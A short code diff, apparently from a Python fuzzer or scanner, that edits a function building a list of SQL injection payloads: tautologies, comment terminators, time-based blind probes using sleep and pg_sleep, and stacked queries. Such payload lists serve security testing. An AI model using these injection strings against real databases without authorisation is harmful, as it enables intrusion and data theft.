@@ -80,7 +80,7 @@ def sql():
 	payload += ["; OR \'%s\'=\'%s\'"%(r_time(),r_time())]
 	payload += ["\'OR \'))%s=%s --"%(r_time(),r_time())]
 	payload += ["\'AND \')))%s=%s --#"%(r_time(),r_time())]
-	payload += [" %s 1=1 --"%(r_string(20))]
+	payload += ["%s 1=1 --"%(r_string(20))]
 	payload += [" or sleep(%s)=\'"%(r_time())]
 	payload += ["%s' AND userid IS NULL; --"%(r_string(10))]
 	payload += ["\") or pg_sleep(%s)--"%(r_time())]
